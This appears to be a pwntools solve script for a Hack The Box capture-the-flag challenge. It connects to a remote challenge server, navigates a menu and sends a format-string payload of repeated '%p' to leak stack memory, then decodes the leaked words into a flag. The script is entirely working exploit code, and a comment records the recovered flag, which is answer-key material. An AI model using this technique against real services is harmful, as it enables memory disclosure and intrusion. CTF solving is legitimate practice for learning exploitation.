from pwn import *
from Crypto.Util.number import long_to_bytes


def main():
    r = remote('167.172.62.51', 30107)
    r.recvuntil("Name: ")
    r.sendline('a')
    r.recvuntil("Nickname: ")
    r.sendline('a')
    r.recvuntil("> ")
    r.sendline('2')
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("> ")
    payload = "%p" * 25
    r.sendline(payload)
    l = r.recvline()
    l = r.recvline()
    l = r.recvline()
    print(l)
    print(str(l))
    a = str(l).split("0x")[1:][:-1]
    print(a)
    a = [long_to_bytes(int(i,16))[::-1] for i in a]
    print(b''.join(a))
    # Flag: HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}

if __name__ == '__main__':
    main()
